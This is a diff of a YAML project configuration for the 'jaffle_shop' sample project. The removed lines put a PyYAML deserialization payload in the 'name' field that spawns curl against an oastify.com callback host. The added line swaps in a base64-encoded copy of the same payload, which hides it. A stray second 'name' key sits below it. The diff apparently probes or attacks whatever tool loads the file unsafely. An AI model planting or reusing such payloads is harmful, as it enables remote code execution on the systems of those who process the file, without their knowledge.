@@ -1,7 +1,4 @@
-name: !!python/object/apply:subprocess.Popen
-    - !!python/tuple
-        - "curl"
-        - "http://3z3vwvzwpd3pnowfxjvu82ng77d11q.oastify.com"
+name: ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0gY3VybAogIC0gaHR0cDovLzN6M3Z3dnp3cGQzcG5vd2Z4anZ1ODJuZzc3ZDExcS5vYXN0aWZ5LmNvbQo=
 
 name: 'jaffle_shop'
 config-version: 2
